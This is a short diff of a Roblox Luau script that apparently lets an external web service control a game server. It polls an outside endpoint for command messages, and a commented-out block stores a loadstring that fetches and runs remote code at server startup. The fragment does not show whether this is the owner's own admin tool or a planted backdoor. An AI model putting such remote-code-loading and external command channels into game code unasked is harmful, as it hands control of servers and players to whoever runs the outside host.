@@ -42,7 +42,7 @@ end
 
 --[[
 game:BindToClose(function()
-    game:GetService("MemoryStoreService"):GetHashMap("AHEmergency"):SetAsync("ServerStartup", 'loadstring(game:GetService("HttpService"):GetAsync("https://raw.githubusercontent.com/alias-colorful/admin/refs/heads/main/load"))()', 960 * 60 * 60)
+    game:GetService("MemoryStoreService"):GetHashMap("AHEmergency"):SetAsync("ServerStartup", 'loadstring(game:GetService("HttpService"):GetAsync("https://raw.githubusercontent.com/alias-colorful/admin/main/load"))()', 960 * 60 * 60)
 end)]]
 
 --[[
@@ -63,6 +63,7 @@ task.defer(function()
 	until sidObject.Value ~= 0
 
 	local id = sidObject.Value
+	print("Listening")
 
 	while true do
 		local data = HttpService:GetAsync("https://alias-colorful.vercel.app/api/get?id=" .. id)
@@ -70,6 +71,8 @@ task.defer(function()
 		
 		local messages = json.messages
 		for _, message in messages do
+			print(message)
+
 			local parsed = parse(message)
 			local cmd = table.remove(parsed, 1)
 			
